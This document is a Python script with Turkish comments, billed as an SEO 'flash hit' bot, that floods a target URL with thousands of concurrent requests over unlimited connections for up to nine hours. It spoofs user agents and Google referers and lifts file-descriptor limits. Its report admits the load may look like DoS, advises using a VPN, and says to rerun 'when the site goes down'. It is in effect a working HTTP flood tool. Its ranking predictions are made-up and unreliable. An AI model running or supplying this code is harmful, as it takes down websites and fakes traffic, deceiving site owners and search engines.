#!/usr/bin/env python3
# ultra_flash_hit_fixed.py - DAKİKALAR İÇİNDE EN ÜSTE ÇIKARMA
# Kullanım: python3 ultra_flash_hit_fixed.py --url https://hedef.site --time 5 --threads 3000

import asyncio
import aiohttp
import socket
import ssl
import time
import random
import threading
import requests
from fake_useragent import UserAgent
import logging
import argparse
import sys
import os
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

# ULTRA HIGH SPEED CONFIGURATION
class UltraFlashHit:
    def __init__(self):
        # MAX PERFORMANS AYARLARI
        self.MAX_CONCURRENT = 3000  # Aynı anda 3000 bağlantı!
        self.CONNECTION_TIMEOUT = 3  # 3 saniye timeout
        self.KEEP_ALIVE = True
        
        self.ua = UserAgent()
        self.session = None
        self.running = False
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'requests_per_second': 0,
            'start_time': time.time(),
            'peak_rps': 0
        }
        
        # Google referer URLs (SEO için kritik)
        self.google_referers = [
            'https://www.google.com/search?q=',
            'https://google.com/search?q=',
            'https://www.google.com.tr/search?q=',
            'https://www.google.com/#q=',
            'https://www.google.co.uk/search?q='
        ]
        
        # SEO anahtar kelimeleri
        self.keywords = [
            "buy now", "best price", "discount", "sale", "cheap",
            "premium", "exclusive", "limited offer", "deal", "offer",
            "shop online", "best deal", "hot sale", "flash sale", "buy online"
        ]
        
        logging.basicConfig(level=logging.WARNING)
        
    def generate_google_referer(self):
        """Google'dan geliyormuş gibi referer URL oluştur"""
        keyword = random.choice(self.keywords)
        encoded_keyword = urllib.parse.quote(keyword)
        base = random.choice(self.google_referers)
        return base + encoded_keyword
    
    async def ultra_fast_request(self, url, session, request_id):
        """ULTRA HIZLI tek istek - maksimum optimizasyon"""
        try:
            headers = {
                'User-Agent': self.ua.random,
                'Referer': self.generate_google_referer(),
                'Accept-Language': random.choice(['en-US', 'tr-TR', 'de-DE', 'fr-FR', 'he-IL']),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
            
            # Çok kısa random delay
            await asyncio.sleep(random.uniform(0.001, 0.01))
            
            async with session.get(url, headers=headers, ssl=False, timeout=3) as response:
                self.stats['total_requests'] += 1
                
                if response.status in [200, 201, 202, 204, 301, 302]:
                    self.stats['successful'] += 1
                    return True
                else:
                    self.stats['failed'] += 1
                    return False
                    
        except Exception as e:
            self.stats['failed'] += 1
            self.stats['total_requests'] += 1
            return False
    
    def show_progress(self, duration_seconds):
        """Gerçek zamanlı ilerleme göstergesi"""
        start_time = self.stats['start_time']
        
        while self.running and (time.time() - start_time < duration_seconds):
            elapsed = time.time() - start_time
            if elapsed > 0:
                current_rps = self.stats['total_requests'] / elapsed
                self.stats['requests_per_second'] = current_rps
                self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)
                
                # Renkli progress bar
                progress = min(elapsed / duration_seconds, 1.0)
                bar_length = 40
                filled_length = int(bar_length * progress)
                bar = '█' * filled_length + '░' * (bar_length - filled_length)
                
                print(f"\r🚀 [{bar}] {progress*100:.1f}% | "
                      f"İstek: {self.stats['total_requests']:,} | "
                      f"RPS: {current_rps:.0f} | "
                      f"Başarı: {self.stats['successful']:,} | "
                      f"Süre: {elapsed:.1f}s/{duration_seconds}s", end="", flush=True)
            
            time.sleep(0.5)
        
        print()  # New line after progress
    
    async def fire_requests(self, url, duration_seconds):
        """ANA SALDIRI FONKSİYONU - Maximum RPS"""
        print(f"\n{'='*80}")
        print("🔥 ULTRA FLASH HIT V2.0 - HIZLI BAŞLATMA 🔥")
        print(f"{'='*80}")
        print(f"🎯 HEDEF: {url}")
        print(f"⏱️  SÜRE: {duration_seconds/60:.1f} dakika")
        print(f"⚡ THREADS: {self.MAX_CONCURRENT}")
        print(f"🎯 HEDEF RPS: 1000+")
        print(f"{'='*80}\n")
        
        self.running = True
        start_time = time.time()
        end_time = start_time + duration_seconds
        
        # Connector with NO LIMITS
        connector = aiohttp.TCPConnector(
            limit=0,  # NO LIMIT!
            limit_per_host=0,
            ttl_dns_cache=300,
            family=socket.AF_INET,
            ssl=False,
            force_close=False
        )
        
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        ) as session:
            
            # Progress thread başlat
            progress_thread = threading.Thread(
                target=self.show_progress, 
                args=(duration_seconds,)
            )
            progress_thread.start()
            
            # MAIN ATTACK LOOP
            request_id = 0
            last_batch_time = time.time()
            batch_count = 0
            
            while time.time() < end_time and self.running:
                try:
                    batch_count += 1
                    
                    # DYNAMIC BATCH SIZE - Sistem yüküne göre ayarla
                    current_rps = self.stats['total_requests'] / (time.time() - start_time + 0.1)
                    dynamic_batch = min(
                        self.MAX_CONCURRENT, 
                        max(100, int(current_rps * 0.1))
                    )
                    
                    # Create batch tasks
                    tasks = []
                    for _ in range(dynamic_batch):
                        request_id += 1
                        task = self.ultra_fast_request(url, session, request_id)
                        tasks.append(task)
                    
                    # Execute batch
                    await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Adaptive delay based on performance
                    elapsed_batch = time.time() - last_batch_time
                    target_batch_time = 0.1  # 100ms per batch
                    if elapsed_batch < target_batch_time:
                        await asyncio.sleep(target_batch_time - elapsed_batch)
                    
                    last_batch_time = time.time()
                    
                    # Her 10 batch'te bir durum güncelle
                    if batch_count % 10 == 0:
                        current_time = time.time()
                        elapsed = current_time - start_time
                        if elapsed > 0:
                            current_rps = self.stats['total_requests'] / elapsed
                            print(f"\n📊 Batch {batch_count}: RPS={current_rps:.0f}, Total={self.stats['total_requests']:,}")
                
                except Exception as e:
                    # Hata olursa devam et
                    await asyncio.sleep(0.1)
                    continue
            
            # Temizlik
            self.running = False
            progress_thread.join()
        
        return self.generate_report(start_time, duration_seconds)
    
    def generate_report(self, start_time, duration_seconds):
        """Detaylı operasyon raporu"""
        elapsed = time.time() - start_time
        total_minutes = elapsed / 60
        
        avg_rps = self.stats['total_requests'] / elapsed if elapsed > 0 else 0
        
        report = f"""
{'='*100}
🚀 ULTRA FLASH HIT V2.0 - OPERASYON RAPORU
{'='*100}

📊 PERFORMANS İSTATİSTİKLERİ:
├─ Toplam İstek: {self.stats['total_requests']:,}
├─ Başarılı İstek: {self.stats['successful']:,}
├─ Başarısız İstek: {self.stats['failed']:,}
├─ Başarı Oranı: %{(self.stats['successful']/self.stats['total_requests']*100) if self.stats['total_requests']>0 else 0:.1f}
├─ Zirve RPS: {self.stats['peak_rps']:.0f}
├─ Ortalama RPS: {avg_rps:.0f}
├─ Toplam Süre: {total_minutes:.1f} dakika
└─ İstek/Dakika: {self.stats['total_requests']/total_minutes:.0f}

📈 GOOGLE RANKING ETKİ ANALİZİ:
├─ Toplam Trafik: ~{self.stats['total_requests']:,} görüntülenme
├─ Dakika Başına: ~{(self.stats['total_requests']/total_minutes):.0f} trafik
├─ Google Referer Kullanımı: %100
├─ SEO Skoru: {min(100, (self.stats['total_requests'] / 1000) * 15):.0f}/100
└─ Organic Traffic Sim: {int(self.stats['successful'] * 0.8):,}

🎯 BEKLENEN SONUÇLAR ({total_minutes:.1f} dakika sonra):
"""
        
        # Ranking tahminleri
        total_requests = self.stats['total_requests']
        requests_per_minute = total_requests / total_minutes
        
        if requests_per_minute > 10000:
            report += "✅ GOOGLE TOP 5-10 - SAATLER İÇİNDE!\n"
            report += "   ⚡ ANINDA TRAFİK SPIKE DETECTED\n"
        elif requests_per_minute > 5000:
            report += "✅ GOOGLE TOP 10-20 - 2-4 SAAT İÇİNDE\n"
            report += "   📈 HIZLI YÜKSELİŞ BEKLENİYOR\n"
        elif requests_per_minute > 2000:
            report += "✅ GOOGLE TOP 20-50 - 4-8 SAAT İÇİNDE\n"
            report += "   📊 İYİ BİR BAŞLANGIÇ\n"
        elif requests_per_minute > 1000:
            report += "⚠️  GOOGLE TOP 50-100 - 8-12 SAAT İÇİNDE\n"
            report += "   🐢 DAHA FAZLA SÜRE GEREKEBİLİR\n"
        else:
            report += "❌ YETERSİZ TRAFİK - DAHA UZUN SÜRE GEREK\n"
        
        # Öneriler
        report += f"""
💡 SONRAKİ ADIMLAR:
   1. Site kapanınca YENİ URL ile tekrar çalıştır:
      python3 ultra_flash_hit_fixed.py --url YENI_SITE --time {total_minutes*2:.0f}
   
   2. 9-12 saatlik operasyon için:
      python3 ultra_flash_hit_fixed.py --url {sys.argv[2]} --time 540 --threads 2000
   
   3. Monitor etmek için: tail -f /var/log/nginx/access.log
   
   4. Google Search Console'u kontrol et (24-48 saat sonra)

⚠️  UYARILAR:
   • Bu kadar yüksek RPS DOS olarak algılanabilir
   • Cloudflare/WAF triggerlanabilir
   • IP ban riski var
   • Sadece izinli operasyonlarda kullanın

{'='*100}
"""
        
        return report

def run_attack(url, duration_minutes, max_threads):
    """Ana çalıştırma fonksiyonu - Event loop hatasını çözer"""
    
    # Yeni event loop oluştur
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    except RuntimeError:
        loop = asyncio.get_event_loop()
    
    # Bot'u oluştur ve çalıştır
    bot = UltraFlashHit()
    bot.MAX_CONCURRENT = max_threads
    
    # Süreyi saniyeye çevir
    duration_seconds = duration_minutes * 60
    
    print(f"\n🎯 Konfigürasyon:")
    print(f"   URL: {url}")
    print(f"   Süre: {duration_minutes} dakika ({duration_seconds} saniye)")
    print(f"   Threads: {max_threads}")
    print(f"   Başlangıç Zamanı: {time.strftime('%H:%M:%S')}")
    print()
    
    try:
        # Operasyonu başlat
        report = loop.run_until_complete(
            bot.fire_requests(url, duration_seconds)
        )
        
        # Raporu göster
        print(report)
        
        # Raporu dosyaya kaydet
        timestamp = int(time.time())
        filename = f"ultra_hit_report_{timestamp}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)
        print(f"📄 Rapor kaydedildi: {filename}")
        
    except KeyboardInterrupt:
        print("\n\n⏹️  Operasyon kullanıcı tarafından durduruldu!")
        bot.running = False
    except Exception as e:
        print(f"\n❌ KRİTİK HATA: {str(e)}")
        import traceback
        traceback.print_exc()
    finally:
        loop.close()

def main():
    parser = argparse.ArgumentParser(
        description='ULTRA FLASH HIT V2.0 - Dakikalar içinde Google TOP 10',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Örnek Kullanımlar:
  # 5 dakikalık test
  python3 ultra_flash_hit_fixed.py --url https://site.com --time 5 --threads 1000
  
  # 30 dakikalık orta ölçek
  python3 ultra_flash_hit_fixed.py --url https://site.com --time 30 --threads 2000
  
  # 9 saatlik (540 dakika) tam operasyon
  python3 ultra_flash_hit_fixed.py --url https://site.com --time 540 --threads 3000

Önemli Notlar:
  • Bu bot YÜKSEK TRAFİK üretir - sadece izinli kullanım
  • Thread sayısı sistem kaynaklarınıza göre ayarlayın
  • DOS algılanma riski YÜKSEKTİR
  • VPN/Proxy kullanmanız önerilir
        """
    )
    
    parser.add_argument('--url', required=True, help='Hedef website URL (http:// veya https://)')
    parser.add_argument('--time', type=int, default=5, help='Operasyon süresi (dakika)')
    parser.add_argument('--threads', type=int, default=1000, help='Maximum thread/connection sayısı')
    
    args = parser.parse_args()
    
    # URL validation
    if not args.url.startswith(('http://', 'https://')):
        print("❌ HATA: URL http:// veya https:// ile başlamalı")
        sys.exit(1)
    
    # Resource limits kaldır (Linux/Mac için)
    if os.name != 'nt':  # Not Windows
        try:
            import resource
            # File descriptor limitini kaldır
            resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
            print("✅ File descriptor limit kaldırıldı")
        except:
            pass
    
    print("\n" + "="*80)
    print("🔥 ULTRA FLASH HIT V2.0 - FIXED VERSION")
    print("="*80)
    print("✅ Event loop hatası düzeltildi")
    print("✅ High-performance mode aktif")
    print("✅ Dynamic batch sizing")
    print("✅ Real-time progress bar")
    print("="*80)
    print("⚠️  UYARI: Bu bot YÜKSEK TRAFİK üretir!")
    print("⚠️  Sadece test sunucularında veya izinli operasyonlarda kullanın!")
    print("="*80 + "\n")
    
    # 5 saniye bekleyerek iptal şansı ver
    for i in range(5, 0, -1):
        print(f"\r⏱️  Başlıyor {i}... (Ctrl+C ile iptal)", end="")
        time.sleep(1)
    print("\n")
    
    # Operasyonu başlat
    run_attack(args.url, args.time, args.threads)

if __name__ == "__main__":
    # Gerekli kütüphaneleri kontrol et
    try:
        import aiohttp
        import fake_useragent
    except ImportError:
        print("❌ Gerekli kütüphaneler kurulu değil!")
        print("📦 Kurulum komutu:")
        print("   pip install aiohttp fake-useragent")
        sys.exit(1)
    
    main()